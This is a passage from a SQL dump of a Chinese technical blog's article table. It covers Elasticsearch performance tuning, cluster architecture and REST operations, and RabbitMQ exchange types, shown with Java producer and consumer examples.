数据量很大,如何提高查询性能\n![ElasticSearchfileSystemCache.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623138279_ElasticSearch-fileSystemCache.png)\n```java\nes性能优化是没有什么银弹的，不要期待着随手调一个参数，就可以万能的应对所有的性能慢的场景。\n也许有的场景是你换个参数，或者调整一下语法，就可以搞定，但是绝对不是所有场景都可以这样。\n\n(1）filesystem cache\n1. os cache，操作系统的缓存,性能优化的杀手锏\n2. 你往es里写的数据，实际上都写到磁盘文件里去了，磁盘文件里的数据操作系统会自动将里面的数据缓存到os cache里面去\n3. es的搜索引擎严重依赖于底层的filesystem cache，你如果给filesystem cache更多的内存，尽量让内存可以容纳所有的indx segment file索引数据文件，那么你搜索的时候就基本都是走内存的，性能会非常高。\n4. 如果走磁盘一般肯定上秒，搜索性能绝对是秒级别的，1秒，5秒，10秒。但是如果是走filesystem cache，是走纯内存的，那么一般来说性能比走磁盘要高一个数量级，基本上就是毫秒级的，从几毫秒到几百毫秒不等。\n5. 比如说，你，es节点有3台机器，每台机器，看起来内存很多，64G，总内存，64 * 3 = 192g\n每台机器给es jvm heap是32G，那么剩下来留给filesystem cache的就是每台机器才32g，总共集群里给filesystem cache的就是32 * 3 = 96g内存\n如果你此时，你整个，磁盘上索引数据文件，在3台机器上，一共占用了1T的磁盘容量，你的es数据量是1t，每台机器的数据量是333g\nfilesystem cache的内存才100g，十分之一的数据可以放内存，其他的都在磁盘，然后你执行搜索操作，大部分操作都是走磁盘，性能肯定差\n要让es性能要好，最佳的情况下，就是你的机器的内存，至少可以容纳你的总数据量的一半\n比如说，你一共要在es中存储1T的数据，那么你的多台机器留个filesystem cache的内存加起来综合，至少要到512G，至少半数的情况下，搜索是走内存的，性能一般可以到几秒钟，2秒，3秒，5秒\n6. 在es中就存少量的数据，就是你要用来搜索的那些索引，内存留给filesystem cache的，就100G，那么你就控制在100gb以内，相当于是，你的数据几乎全部走内存来搜索，性能非常之高，一般可以在1秒以内\n比如说你有一行数据\nid name age ....30个字段\n但是你搜索，只需要根据id name age三个字段来搜索\n如果你傻乎乎的往es里写入一行数据所有的字段，就会导致说70%的数据是不用来搜索的，结果硬是占据了es机器上的filesystem cache的空间，单挑数据的数据量越大，就会导致filesystem cahce能缓存的数据就越少\n仅仅只是写入es中要用来检索的少数几个字段就可以了，比如说，就写入es id name age三个字段就可以了，然后你可以把其他的字段数据存在mysql里面，一般是建议用es + hbase的这么一个架构。\nhbase的特点是适用于海量数据的在线存储，就是对hbase可以写入海量数据，不要做复杂的搜索，就是做很简单的一些根据id或者范围进行查询的这么一个操作就可以了\n从es中根据name和age去搜索，拿到的结果可能就20个doc id，然后根据doc id到hbase里去查询每个doc id对应的完整的数据，给查出来，再返回给前端。\n你最好是写入es的数据小于等于，或者是略微大于es的filesystem cache的内存容量\n然后你从es检索可能就花费20ms，然后再根据es返回的id去hbase里查询，查20条数据，可能也就耗费个30ms，可能你原来那么玩儿，1T数据都放es，会每次查询都是5~10秒，现在可能性能就会很高，每次查询就是50ms。\nelastcisearch减少数据量仅仅放要用于搜索的几个关键字段即可，尽量写入es的数据量跟es机器的filesystem cache是差不多的就可以了；其他不用来检索的数据放hbase里，或者mysql。\nes数据量很少，10个字段的数据，都可以放内存，就用来搜索，搜索出来一些id，通过id去mysql，hbase里面去查询明细的数据\n\n（2）数据预热\n哪怕是你就按照上述的方案去做了，es集群中每个机器写入的数据量还是超过了filesystem cache一倍，\n比如说你写入一台机器60g数据，结果filesystem cache就30g，还是有30g数据留在了磁盘上。\n1. 数据预热是什么,举个例子，就比如说，微博，你可以把一些大v，平时看的人很多的数据给提前你自己后台搞个系统，每隔一会儿，你自己的后台系统去搜索一下热数据，刷到filesystem cache里去，后面用户实际上来看这个热数据的时候，他们就是直接从内存里搜索了，很快。\n2. 电商，你可以将平时查看最多的一些商品，比如说iphone 12，热数据提前后台搞个程序，每隔1分钟自己主动访问一次，刷到filesystem cache里去。 \n3. 对于那些你觉得比较热的，经常会有人访问的数据，最好做一个专门的缓存预热子系统，就是对热数据，每隔一段时间，你就提前访问一下，让数据进入filesystem cache里面去。这样期待下次别人访问的时候，一定性能会好一些\n\n（3）冷热分离\n1. es可以做类似于mysql的水平拆分，就是说将大量的访问很少，频率很低的数据，单独写一个索引，然后将访问很频繁的热数据单独写一个索引\n2. 你最好是将冷数据写入一个索引中，然后热数据写入另外一个索引中，这样可以确保热数据在被预热之后，尽量都让他们留在filesystem os cache里，别让冷数据给冲刷掉。\n3. 假设你有6台机器，2个索引，一个放冷数据，一个放热数据，每个索引3个shard\n3台机器放热数据index；另外3台机器放冷数据index\n这样的话，你大量的时候是在访问热数据index，热数据可能就占总数据量的10%，此时数据量很少，几乎全都保留在filesystem cache里面了，就可以确保热数据的访问性能是很高的。\n但是对于冷数据而言，是在别的index里的，跟热数据index都不在相同的机器上，大家互相之间都没什么联系了。如果有人访问冷数据，可能大量数据是在磁盘上的，此时性能差点，就10%的人去访问冷数据；90%的人在访问热数据。\n\n（4）document模型设计\n1. document模型设计是非常重要的，很多操作，不要在搜索的时候才想去执行各种复杂的乱七八糟的操作。es能支持的操作就是那么多，不要考虑用es做一些它不好操作的事情\n2. 尽量在document模型设计的时候，写入的时候就完成。另外对于一些太复杂的操作，比如join，nested，parent-child搜索都要尽量避免，性能都很差的\n3. 在写入数据的时候，就设计好模型，加几个字段，把处理好的数据写入加的字段里面\n4. 自己用java程序封装，es能做的，用es来做，搜索出来的数据，在java程序里面去做，比如说我们，基于es，用java封装一些特别复杂的操作\n\n（5）分页性能优化\nes的分页是较坑的\n假如你每页是10条数据，你现在要查询第100页，实际上是会把每个shard上存储的前1000条数据都查到一个协调节点上，如果你有个5个shard，那么就有5000条数据，接着协调节点对这5000条数据进行一些合并、处理，再获取到最终第100页的10条数据。\n你要查第100页的10条数据，你是不可能说从5个shard，每个shard就查2条数据？最后到协调节点合并成10条数据？你必须得从每个shard都查1000条数据过来，然后根据你的需求进行排序、筛选等等操作，最后再次分页，拿到里面第100页的数据。\n翻页的时候，翻的越深，每个shard返回的数据就越多，而且协调节点处理的时间越长。非常坑爹。所以用es做分页的时候，你会发现越翻到后面，就越是慢。\n1. 你系统不允许他翻那么深的页，默认翻的越深，性能就越差\n2. 类似于app里的推荐商品不断下拉出来一页一页的,你可以用scroll api,scroll会一次性给你生成所有数据的一个快照，然后每次翻页就是通过游标移动，获取下一页下一页这样子，性能会比上面说的那种分页性能也高很多很多\nscroll的原理实际上是保留一个数据快照，然后在一定时间内，你如果不断的滑动往后翻页的时候，类似于你现在在浏览微博，不断往下刷新翻页。那么就用scroll不断通过游标获取下一页数据，这个性能是很高的，比es实际翻页要好的多的多,无论翻多少页，性能基本上都是毫秒级的。\n但是唯一的一点就是，这个适合于那种下拉翻页的，不能随意跳到任何一页的场景。同时这个scroll是要保留一段时间内的数据快照的，你需要确保用户不会持续不断翻页翻几个小时。\nscroll api是只能一页一页往后翻的，是不能说，先进入第10页，然后去120页，回到33页，不能随意乱跳页。\n\n```', 0, 0, 122, 0, 0, '2019-09-05 13:13:51', '2020-03-25 13:13:51', 0, 0);
INSERT INTO `article` VALUES (34, 1, 'elasticsearch基本架构', '2019/4/1555160424_45fb37f87fe539b331f7f839ba315dc0.jpg', '### 基本概念\n```java\n// elasticsearch是什么\n1. es是一个基于luncene构建的开源,分布式,restful接口全文搜索引擎\n2. es是一个分布式文档数据库,其中每个字段均是被索引的数据且可被搜索,它能够扩展至数以百计的服务器存储以及处理PB级的数据\n3. es是一个分布式全文检索框架,隐藏复杂处理机制,内部使用分片机制,集群发现,分片负载均衡技术路由\n4. es可以在很短的时间内存储,搜索和分析大量的数据,它通常作为具有复杂搜索场景情况下的核心发动机\n5. 与solr都是基于luncene,但elasticsearch显得轻巧,简易\n\n// 倒排索引结构\n1. 因为基于luncene,全文检索的倒序索引理念与luncene相同\n2. 正排索引结构是穷举每一个文档,从每个文档找到相应内容,效率极差\n3. 倒排索引结构是根据内容(词语)找文档,这种索引的结构叫做倒排索引结构\n\n// 为什么倒排索引比数据查询速度快\n1. *数据库查询的结构为B+树,但B+树的效率并没有倒排索引速度迅速*\n2. 将搜索内容进行关键字分词,通过关键字分词定位到文档内容,倒排索引速度是极快的,即使需要在上千万的数据中查找内容,对于倒排索引来说只需要9毫秒左右\n\n// elasticsearch如何做到修改时的并发问题\n1. 采用CAS乐观锁的机制\n2. 数据version自增长,修改数据后,version会自动加1\n\n// elasticsearch特点\n1. 横向扩展: 只需要增加服务器,做些配置,启动一些elasticsearch就可以并入集群,elasticsearch集群性能极佳\n2. 分片机制提供更多的分布性: 同一个索引分成多个分片,这点类似于HDFS的块机制,分而治之方式提升处理效率\n3. 高可用: 提供复制机制,一个分片可以设置多个复制,使得某台服务器在宕机的情况下,集群仍旧可以照常运行,并且会将服务器宕机丢失的数据信息复制恢复到其他可用节点上\n\n// elasticsearch应用场景\n1. 网站站内搜索\n2. 网盘搜索引擎\n3. 大型电商商品搜索系统\n4. 大型分布式日志分析系统ELK,elasticsearch(存储日志)+logstash(收集日志)+kibana(展示数据)\n\n// 存储结构\n// 字段,字段类型,文档\n{\n    \"user\":{ // 类型对象\n        \"properties\":{\n            \"age\":{\n                \"type\":\"long\"\n            },\n            \"name\":{ // 字段名\n                \"type\":\"text\", // 字段类型\n                \"analyzer\":\"ik_smart\" // 指定分词解析器\n            },\n            \"birthday\":{\n                \"type\":\"keyword\"\n            }\n        }\n    }\n}\n\n1.  elasticsearch是面向文档型数据库,*一条数据在这里就是一个文档,用JSON作为文档序列化的格式*\n2. 类型指的是文档的类型,查询时会依据这些类型进行不同的处理\n3. 数字默认映射为long类型,字符串分为text和keyword,*text会进行分词,keyword不会进行分词*\n\n// 文档映射\n1. 静态映射: 在elasticsearch中也可以事先定义好映射,包含文档的各个字段的类型和指定分词解析器等,这种方式称为静态映射(推荐)\n2. 动态映射: elasticSearch中不需要事先定义映射,文档写入elasticsearch时,会根据文档字段自动识别类型,这种机制称为动态映射\n\n// 结构单位与Mysql关系类比\n2. 关系数据库: 字段 => 行 => 表 => 数据库 \n3. elasticsearch: 字段 => 文档 => 类型对象 => 索引\n\n	// 基本操作\n	// 创建\n	PUT /mytest   		// 创建索引\n	PUT /mytest/user 	// 类型对象\n	PUT /mytest/user/1 { 	// 创建文档\n		\"name\": \"tuwq\", \n		\"age\": \"20\",\n		\"birthday\": \"1203\"\n	}\n\n	// 删除\n	DELETE /mytest  // 删除索引及索引下所有文档\n\n	// 修改\n	POST mytest/user/1/_update { // 修改某文档的字段信息\n    		\"doc\" : {\n        		\"name\" : \"tuwq\",\n				\"age\": \"21\" \n    		}\n	}\n	POST /mytest/_mapping/user { // 修改字段映射设置\n    		\"user\":{ // 类型对象\n        		\"properties\":{\n            			\"age\":{\n                			\"type\":\"long\"\n            			},\n            			\"name\":{ // 字段名\n                			\"type\":\"text\", // 字段类型\n                			\"analyzer\":\"ik_smart\" // 指定分词解析器\n            			},\n            			\"birthday\":{\n                			\"type\":\"keyword\"\n            			} \n        		 }\n    		}\n	}\n\n	// 查询\n	GET /mytest/user/1 // 某文档所有字段\n	GET /mytest/user/_mget { \"ids\": [\"1\",\"2\"]} // 根据多id查询文档\n	GET /mytest/user/_search // 某索引下全部文档\n	GET /mytest/user/_search?q=age:21 // 某索引下所有文档进行年龄查询\n	GET /mytest/user/_search?q=age[30 TO 60] // 某索引下所有文档进行年龄区间查询\n	GET /mytest/user/_search { // 精确查询姓名\n    		\"query\":{\n        		\"term\":{ // term完全精确匹配\n            			\"name\":\"tuwq\"\n        		 }\n    		}\n	}\n	GET /mytest/user/_search { // 模糊查询汽车名称\n    		\"query\":{\n        		\"match\":{ // 模糊匹配,并会进行分词器分析\n            			\"car\":\"特斯拉\"\n        		 }\n    		}\n	}\n	GET /mytest/user/_search { // 模糊查询汽车名称并分页\n    		\"from\":\"0\", // 相当于mysql的limit中的skip\n    		\"size\":\"2\",// 相当于mysql的limit中的size\n    		\"query\":{\n        		\"match\":{ // 模糊匹配,并会进行分词器分析\n            			\"car\":\"保时捷\"\n				 }\n        	}\n    } \n    GET /mytest/_mapping // 查询映射信息,相当于数据库查看设计字段信息\n\n1. DSL查询: 使用JSON完整的请求体叫做结构化查询(DSL),dsl查询更为直观也更简易,所有大都使用这种方式,dsl查询是post过去一个json,由于post请求是json格式,所以存在很多灵活性,也有很多形式\n2. *term完全精确匹配*查询姓名,即不进行分词器分析,文档中必须包含整个搜索词汇\n3. *match相当于模糊匹配*,会进行分词器分析,只包含其中一部分关键词即可\n```\n\n### 架构原理\n![ElasticSearch集群原理.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623126242_ElasticSearch-集群原理.png)\n```java\nelasticsearch设计的理念就是分布式搜索引擎，底层其实还是基于lucene的。\n// 架构原理\n1. 核心思想就是在多台机器上启动多个es进程实例，组成了一个es集群。\n2. es中存储数据的基本单位是索引，比如说你现在要在es中存储一些订单数据，你就应该在es中创建一个索引\n3. order_idx，所有的订单数据就都写到这个索引里面去，一个索引差不多就是相当于是mysql里的一张表。index -> type -> mapping -> document -> field。\n	(1) index：相当于mysql里的一张表\n	(2) type：没法跟mysql里去对比，一个index里可以有多个type，每个type的字段都是差不多的，但是有一些略微的差别。\n4. 很多情况下，一个index里可能就一个type，但是确实如果说是一个index里有多个type的情况，你可以认为index是一个类别的表，具体的每个type代表了具体的一个mysql中的表\n每个type有一个mapping，如果你认为一个type是一个具体的一个表，index代表了多个type的同属于的一个类型，mapping就是这个type的表结构定义，你在mysql中创建一个表，肯定是要定义表结构的，里面有哪些字段，每个字段是什么类型。。。\n5. mapping就代表了这个type的表结构的定义，定义了这个type中每个字段名称，字段是什么类型的，然后还有这个字段的各种配置\n	实际上你往index里的一个type里面写的一条数据，叫做一条document，一条document就代表了mysql中某个表里的一行给，每个document有多个field，每个field就代表了这个document中的一个字段的值\n6. 一个索引，这个索引可以拆分成多个shard，每个shard存储部分数据\n7. 这个shard的数据实际是有多个备份，就是说每个shard都有一个primary shard，负责写入数据，但是还有几个replica shard。primary shard写入数据之后，会将数据同步到其他几个replica shard上去。\n8. 通过这个replica的方案，每个shard的数据都有多个备份，如果某个机器宕机了，没关系啊，还有别的数据副本在别的机器上呢,实现了高可用\n9. es集群多个节点，会自动选举一个节点为master节点，这个master节点其实就是干一些管理的工作的，比如维护索引元数据拉，负责切换primary shard和replica shard身份之类的。\n10. 要是master节点宕机了，那么会重新选举一个节点为master节点\n11. 如果是非master节点宕机了，那么会由master节点，让那个宕机节点上的primary shard的身份转移到其他机器上的replica shard\n12. 急着你要是修复了那个宕机机器，重启了之后，master节点会控制将缺失的replica shard分配过去，同步后续修改的数据之类的，让集群恢复正常。\n13. 其实上述就是elasticsearch作为一个分布式搜索引擎最基本的一个架构设计\n\n// es为什么要集群\n1. 在单台es服务器节点上,随着业务量的发展索引文件慢慢增多,会影响到效率和内存存储问题等\n2. 采用es集群,将单个索引的分片到多个不同分布式物理机器上存储,从而实现高可用,容错性等\n3. 如果es实现了集群的话,会将单台服务器节点的索引文件使用分片技术,分布式存放在多个不同的物理机器上\n4. 运行分片机制将数据拆分成多台节点进行存放\n5. 在es分片技术中,分为主分片(primaryshards),副本分片(replicas)\n6. 9300端口: ES节点之间通讯使用,ES集群之间TCP协议通讯端口号,9200端口: ES节点和外部通讯进行数据操作的端口,暴露restful接口api\n\n// 分片\n1. 每个索引会被分成多个分片shard进行存储,默认创建索引是五个分片进行存储,每个分片都会分布式部署在多个不同的节点上进行部署,*该分片成为primaryshards主分片(索引的主分片数量定义好后,不能被修改)*\n2. 每一个主分片为了实现高可用,都会有自己对应的备份分片,*主分片对应的备分片不能存放在同一台服务器上,主分片可以和其他非对应的备分片存放在同一个node节点上*\n3. *shards分片*: 代表索引分片,es可以把一个完整的索引分成多个分片,这样的好处是可以把一个大的索引拆分成多个,分布到不同的节点上,构成分布式搜索\n4. *replicas分片*: 代表索引副本,es可以设置多个索引的副本,副本的作用一是提高系统的容错性,当某个节点某个分片损坏或丢失时可以从副本中恢复,二是提高es查询效率,es会自动对搜索请求进行负载均衡\n5. 索引 = number_of_shards 5主分片 + number_of_replicas 1副分片  \n *表示总共10个分片,每个主分片都会对应一个副分片*\n6. 索引 = number_of_shards 5主分片 + number_of_replicas 2副分片   \n *表示总共15个分片,每个主分片都会对应一个副分片*\n7. *主分片的数量只能在索引创建前指定,并且索引创建后不能更改*\n8. 默认分片数为*节点的平方*,比如5的平方=25\n9. 查询索引信息127.0.0.1:9200/myindex/_setting\n\n// 主分片对应的备分片不能够在同一台节点上进行存放\n1. es为了高可用,每个主的分片都会对应有一个备份的分片\n2. *单台es服务器中是没有备用分片的*,因为主分片对应的备分片不能够在同一台节点上进行存放\n3. 主备分片之间进行实时刷新同步,类似于mysql主从复制的binlog二进制传输\n4. 主分片可以和其他非对应的备分片存放在同一个node节点上\n5. 查询时会在主备所在的node节点中进行负载均衡轮询\n\n// 索引的主分片数量定义好后,不能被修改\n1. documentrouting数据路由\n2. 当客户端发起创建document的时候,es需要确定这个document放在哪个index上的哪个shard上,这个过程就是数据路由\n3. 路由算法: shard = hash(routing)(分片id)%number_of_primary_shards\n4. *如果number_of_primary_shards在查询时候取余时发生变化,那么将会无法获取到该数据*\n\n ```', 0, 0, 75, 0, 0, '2019-09-05 21:00:57', '2019-09-05 21:00:57', 0, 0);
INSERT INTO `article` VALUES (35, 1, 'rabbitmq的基本概述', '2018/9/1537078424_2ed8cfd75ff117d7afaa6b3768b5466a.jpg', '### 基本概念\n```java\n// 消息中间件\n1. 消息队列中间件是分布式系统中重要组件.\n2. 主要解决应用解耦,异步消息,流量削峰等问题\n3. 实现高性能,高可用,可伸缩和最终一致性架构,\n4. 消息中间件不等于消息队列,消息中间件包含消息队列和发布订阅\n\n// JMS规范(Java消息服务)\n1. 提供者: 实现JMS规范的消息中间件服务器\n2. 客户端: 发送或接收消息的应用程序\n3. 生产者/发布者: 创建并发送消息的客户端\n4. 消费者/订阅者: 接收并处理消息的客户端\n5. 消息: 应用程序之间传递的数据内容\n6. 消息模式: 在客户端之间传递消息的方式,JMS中定义了主题和队列两种模式(即发布订阅与点对点通讯)\n\n// 消息队列应用场景\n1. 异步处理耗时操作,并行方式提高处理的时间\n2. 下单调用库存系统或金融交易所时,配合异步通知进行回报\n3. 流量削峰的秒杀,利用Redis+MQ+服务保护(服务降级、隔离、熔断,限流)+图形验证码+一次性token \n\n// rabbitmq是什么\n1. rabbitmq是一个开源的消息代理和队列服务器,用来通过普通协议在完全不同的应用之间共享数据,RabbitMQ是使用erlang语言来编写的,并且RabbitMQ是基于AMQP协议的\n\n// 什么是AMQP高级协议\n1. AMQP全称: AdvancedMessageQueuingProtocol(高级消息队列协议)\n2. AMQP定义: 是具有现代特征的二进制协议.是一个提供统一消息服务的应用层标准高级消息队列协议,是应用层协议的一个开放标准,\n为面向消息的中间件设计\n\n// 高性能是如何做到的?\n1. erlang语言最初在于交换机领域的架构模式,这样使得RabbitMQ在Broker之间进行数据交互的性能是非常优秀的\n2. erlang的优点: erlang有着和原生socket一样的延迟\n\n// 主流mq对比\n1. activemq； 遵循jms规范,安装方便,有可能会丢失消息,性能差,现在的重心在下一代产品apolle上\n2. rabbitmq: 继承erlang天生的并发性,不支持动态扩展,性能较佳,功能多,使用广\n3. kafka: 依赖zk,可动态扩展节点,性能极高,严格的顺序机制,不支持消息优先级,少量数据丢失\n4. rocketmq: 各方面较佳,但是是半开源框架,付钱才可以开启所有功能\n\n```\n#### RabbitMQ整体架构模型\n![Rabbitmq整体架构.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626669740_Rabbitmq-整体架构.png)\n```java\n// AMQP核心概念\n1. server: 又称Broker,接受客户端的连接,实现AMQP实体服务\n2. Connection: 连接,应用程序与Broker的网络连接\n3. Channel: 网络信道,几乎所有的操作都在Channel中进行,Channel是进行消息读写的通道.客户端可建立多个Channel,\n每个Channel代表一个会话任务\n4. Message: 消息,服务器和应用程序之间传送的数据,由Properties和Body组成,Properties可以对消息进行修饰,比如消息的优先级,\n延迟等高级特性,Body则就是消息体内容\n5. VirtualHost: 虚拟地址,用于进行逻辑隔离,相当于Redis中的16个db,最上层的消息路由,一个VirtualHost里面可以有若干个Exchange和Queue,\n同一个VirtualHost里面不能有相同名称的Exchange或Queue\n6. Exchange: 交换机,接受消息,根据路由键转发消息到绑定的队列,有*路由类型(很关键)* \n7. Binding: Exchange和Queue之间的虚拟连接,binding中可以包含routingKey\n8. RoutingKey: 一个路由规则,虚拟机可用它来*确定如何路由一个特定消息*\n9. Queue: 也称MessageQueue,消息队列,保存消息并将它们转发给消费者\n\n// RabbitMQ消息生产消费模型\n1. publisher: 生产者将消息放入exchange\n2. message: 消息内容\n3. exchange: 交换机\n4. queue: 消息队列(一个exchange可以绑定多个queue)\n5. consumer: 消费者从queue中获取消息\n```\n\n### 三种exchange\n```java\n// rabbitMQ的交换机类型\n1. DirectExchange: RouteKye必须*完全匹配*才会被队列接收,否则该消息会被抛弃\n2. TopicExchange： Exchange将RouteKey和某Topic进行*模糊匹配*\n3. FanoutExchange： 发送到交换机的消息都会被转发到与该交换机*绑定的所有队列上*,*无需匹配*\n```\n#### DirectExchange\n```java\n// 生产端\npublic static void main(String[] args) throws Exception {\n		// 创建一个ConnectionFactory\n		ConnectionFactory connectionFactory = new ConnectionFactory();\n		connectionFactory.setHost(\"222.106.111.63\");\n		connectionFactory.setPort(5672);\n		connectionFactory.setUsername(\"guest\");\n		connectionFactory.setPassword(\"guest\");\n		connectionFactory.setVirtualHost(\"/\");\n		\n		// 通过连接工厂创建连接\n		Connection connection = connectionFactory.newConnection();\n		// 通过connection创建Channel\n		Channel channel = connection.createChannel();\n		// 声明\n		String exchangeName = \"test_direct_exchange\";\n		String routingKey = \"test.direct\";\n		String msg = \"DirectExchange\";\n		// 发布一个消息,null的位置是可选配置 \n		channel.basicPublish(exchangeName, routingKey, null, msg.getBytes());\n		// 关闭连接\n		channel.close();\n		connection.close();\n	}\n\n// 消费端\npublic static void main(String[] args) throws Exception {\n		// 创建一个ConnectionFactory\n		ConnectionFactory connectionFactory = new ConnectionFactory();\n		connectionFactory.setHost(\"222.106.111.63\");\n		connectionFactory.setPort(5672);\n		connectionFactory.setUsername(\"guest\");\n		connectionFactory.setPassword(\"guest\");\n		connectionFactory.setVirtualHost(\"/\");\n\n		connectionFactory.setAutomaticRecoveryEnabled(true);\n		connectionFactory.setNetworkRecoveryInterval(3000);\n		// 通过连接工厂创建连接\n		Connection connection = connectionFactory.newConnection();\n		// 通过connection创建Channel\n		Channel channel = connection.createChannel();\n		\n		String exchangeName = \"test_direct_exchange\";\n		// routingKey必须完全匹配\n		String routingKey = \"test.direct\";\n		// exchange类型\n		String type = \"direct\";\n		String queueName = \"test_direct_queue\";\n		// 声明了一个交互机,后面是可选参数\n		channel.exchangeDeclare(exchangeName, type, true, false, false, null);\n		// 声明了一个队列\n		channel.queueDeclare(queueName, false, false, false, null);\n		// 建立绑定关系\n		channel.queueBind(queueName, exchangeName, routingKey);\n		\n		QueueingConsumer consumer = new QueueingConsumer(channel);\n		channel.basicConsume(queueName, true, consumer);\n		while (true) {\n			Delivery delivery = consumer.nextDelivery();\n			String msg = new String(delivery.getBody());\n			System.out.println(\"accpet:\" + msg);\n		}\n	}\n\n// 所有发送到DirectExchange的消息被转发到RouteKey中指定的Queue\n// 注意:Direct模式可以使用RabbitMQ自带的Exchange:defaultExchange,所以不需要将Exchange进行任何绑定(binding)操作,消息传递时,*RouteKye必须完全匹配*才会被队列接收,否则该消息会被抛弃\n```\n#### TopicExchange\n```java\n// 生产端\npublic static void main(String[] args) throws Exception {\n		// ...此处省略connection创建的环节\n		// 通过connection创建Channel\n		Channel channel = connection.createChannel();\n		// 声明\n		String exchangeName = \"test_topic_exchange\";\n		String routingKey1 = \"user.save\";\n		String routingKey2 = \"user.update\";\n		String routingKey3 = \"user.delete.abc\";\n		// 发送\n		String msg = \"TopicExchange\";\n		channel.basicPublish(exchangeName, routingKey1, null, msg.getBytes());\n		channel.basicPublish(exchangeName, routingKey2, null, msg.getBytes());\n		channel.basicPublish(exchangeName, routingKey3, null, msg.getBytes());\n		// 关闭连接\n		channel.close();\n		connection.close();\n	}\n\n// 消费端\npublic static void main(String[] args) throws Exception {\n		// ...此处省略connection创建的环节\n		// 通过connection创建Channel\n		Channel channel = connection.createChannel();\n		// 声明\n		String exchangeName = \"test_topic_exchange\";\n		String type = \"topic\";\n		String queueName = \"test_topic_queue\";\n		\n		String routingKey = \"user.#\";\n		channel.exchangeDeclare(exchangeName, type, true, false, false, null);\n		channel.queueDeclare(queueName, false, false, false, null);\n		channel.queueBind(queueName, exchangeName, routingKey);\n		QueueingConsumer consumer = new QueueingConsumer(channel);\n		channel.basicConsume(queueName, true, consumer);\n		while (true) {\n			Delivery delivery = consumer.nextDelivery();\n			String msg = new String(delivery.getBody());\n			System.out.println(\"accpet:\" + msg);\n		}\n	}\n\n1. 所有发送到TopicExchange的消息被转发到所有关心RouteKey中指定Topic的Queue上\n2. Exchange将RouteKey和某Topic进行*模糊匹配*\n// 注意:可以使用通配符进行模糊匹配\n1. \"#\" 匹配一个或多个词,\"能够匹配到\"log.info.oa\"\n2. \"*\" 匹配不多不少一个词,\"只够匹配到\"log.erro\"\n```\n\n#### FanoutExchange\n```java\n// 生产端\npublic static void main(String[] args) throws Exception {\n		// ...此处省略connection创建的环节\n		// 通过connection创建Channel\n		Channel channel = connection.createChannel();\n		// 声明\n		String exchangeName = \"test_fanout_exchange\";\n		String msg = \"FanoutExchange\";\n		channel.basicPublish(exchangeName, \"\", null, msg.getBytes());\n		\n		// 关闭连接\n		channel.close();\n		connection.close();\n	}\n\n// 消费端\npublic static void main(String[] args) throws Exception {\n		// ...此处省略connection创建的环节\n		// 通过connection创建Channel\n		Channel channel = connection.createChannel();\n		\n		String exchangeName = \"test_fanout_exchange\";\n		String type = \"fanout\";\n		String queueName = \"test_fanout_queue\";\n		String routingKey = \"\";\n		channel.exchangeDeclare(exchangeName, type, true, false, false, null);\n		channel.queueDeclare(queueName, false, false, false, null);\n		channel.queueBind(queueName, exchangeName, routingKey);\n		\n		QueueingConsumer consumer = new QueueingConsumer(channel);\n		channel.basicConsume(queueName, true, consumer);\n		while (true) {\n			Delivery delivery = consumer.nextDelivery();\n			String msg = new String(delivery.getBody());\n			System.out.println(\"accpet:\" + msg);\n		}\n	}\n\n1. 不处理路由键,只需要简单的将队列*绑定到交换机*上 \n2. 发送到交换机的消息都会被转发到与该交换机*绑定的所有队列上*\n3. Fanout交换机转发消息是最快\n```\n\n\n### 其他属性与功能\n```java\n// 创建属性\n// 这些属性一般在创建connectionFactory,exchange和queue使用,也就是上面布尔参数列表,具体参数对应API源码中有说明\n1. VirtualHost: 虚拟地址,用于进行逻辑隔离(就像redis的16个db),最上层的消息路由\n2. Exchange: 接收消息,并根据路由键转发消息所绑定的队列\n3. Name: 交换机名称\n4. Type: 交换机类型 direct,topic,fanout,headers\n5. Durability: 是否持久化,Durable:是,Transient:否\n6. AutoDelete: 当最后一个绑定到Exchange上的队列删除后,自动删除该Exchange\n7. Internal: 当前Exchange是否用于RabbitMQ内部使用,默认为false\n8. Arguments: 扩展参数,用于扩展AMQP协议自制定化使用\n\n// 生产者发送时的额外参数Properties\n// 生产端\npublic static void main(String[] args) throws Exception {\n		// ...此处省略connection创建的环节\n		// 通过connection创建Channel\n		Channel channel = connection.createChannel();\n		// 附加头\n		Map<String, Object> headers = new HashMap<String, Object>();\n		headers.put(\"set1\", \"set1\");\n		headers.put(\"set2\", \"set2\");\n		// 参数设置\n		BasicProperties props = new AMQP.BasicProperties.Builder()\n		.deliveryMode(2)\n		.contentType(\"UTF-8\")\n		.expiration(\"10000\")\n		// 携带附加头\n		.headers(headers)\n		.build();\n		\n		String msg = \"Hello Rabbitmq\";\n		// 1.exchange 2.routingKey\n		channel.basicPublish(\"\", \"test001\", props, msg.getBytes());\n		// 关闭连接\n		channel.close();\n		connection.close();\n	}\n\n// 消费端\npublic static void main(String[] args) throws Exception {\n		// ...此处省略connection创建的环节\n		// 创建一个Channel\n		Channel channel = connection.createChannel();\n		// 创建一个队列\n		// 是否持久化,是否独占,脱离绑定关系后是否删除,扩展参数\n		String queueName = \"test001\";\n		channel.queueDeclare(queueName, true, false, false, null);\n		// 创建消费者\n		QueueingConsumer queueingConsumer = new QueueingConsumer(channel);\n		channel.basicConsume(queueName, true, queueingConsumer);\n		// 获取消息\n		while(true) {\n			Delivery delivery = queueingConsumer.nextDelivery();\n			String msg = new String(delivery.getBody());\n			System.err.println(\"消费端:\" + msg);\n			// 取出headers\n			Map<String, Object> headers = delivery.getProperties().getHeaders();\n			System.out.println(\"headrs get set1-value: \"+headers.get(\"set1\"));\n		}\n	}\n\n1. deliveryMode(持久化)\n2. headers(自定义属性)\n3. content_type(内容类型)\n4. content_encoding(编码)\n```\n#### 回调消息\n```java \n		// 此处省略connection创建...\n		// 通过connection创建Channel\n		Channel channel = connection.createChannel();\n		\n		// 指定确认模式\n		channel.confirmSelect();\n		String exchangeName = \"test_confirm_exchange\";\n		String routingKey = \"confirm.save\";\n		\n		String msg = \"confirmMsg\";\n		channel.basicPublish(exchangeName, routingKey, null, msg.getBytes());\n		\n		// 添加一个确认\n		channel.addConfirmListener(new ConfirmListener() {\n			@Override\n			public void handleNack(long deliveryTag, boolean multiple) throws IOException {\n				System.err.print(\"---------no ack------------\");\n			}\n			@Override\n			public void handleAck(long deliveryTag, boolean multiple) throws IOException {\n				System.err.print(\"---------ack------------\");\n			}\n		});\n\n1. 消息的确认,是指生产者投递消息后,如果Broker收到消息,*则会给我们生产者一个应答*\n2. 